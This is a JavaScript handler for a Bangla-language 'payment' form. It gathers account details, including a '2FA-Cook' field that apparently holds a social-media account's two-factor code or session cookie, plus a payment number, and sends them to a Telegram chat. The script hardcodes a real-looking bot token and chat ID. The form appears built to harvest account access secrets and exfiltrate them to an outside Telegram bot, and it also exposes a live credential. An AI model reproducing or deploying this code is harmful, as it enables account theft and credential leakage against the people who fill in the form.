document.getElementById("paymentForm").addEventListener("submit", function (e) {
    e.preventDefault();

    const chatId = document.getElementById("chatId").value;
    const accountType = document.getElementById("accountType").value;
    const friendType = document.getElementById("friendType").value;
    const tofaCook = document.getElementById("tofaCook").value;
    const accountDate = document.getElementById("accountDate").value;
    const paymentMethod = document.getElementById("paymentMethod").value;
    const paymentNumber = document.getElementById("paymentNumber").value;

    const botToken = "8069445943:AAGN3UX_B2oc8tgeofdu6kdexjRVC2Srsvo";
    const chatIdForBot = "7708954371";

    const message = `
        পেমেন্ট রিকুয়েস্ট:
        - Chat ID: ${chatId}
        - Account Type: ${accountType}
        - Friend Type: ${friendType}
        - 2FA-Cook: ${tofaCook}
        - Account Date: ${accountDate}
        - Payment Method: ${paymentMethod}
        - Payment Number: ${paymentNumber}
    `;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatIdForBot}&text=${encodeURIComponent(message)}`;

    fetch(url)
        .then((response) => {
            if (response.ok) {
                showPopup();
            } else {
                alert("কিছু সমস্যা হয়েছে। আবার চেষ্টা করুন।");
            }
        })
        .catch((error) => {
            console.error("Error:", error);
            alert("সার্ভার সমস্যার জন্য অনুরোধ পাঠানো যায়নি।");
        });
});

function showPopup() {
    document.getElementById("popup").style.display = "flex";
}

function closePopup() {
    document.getElementById("popup").style.display = "none";
    document.getElementById("paymentForm").reset();
}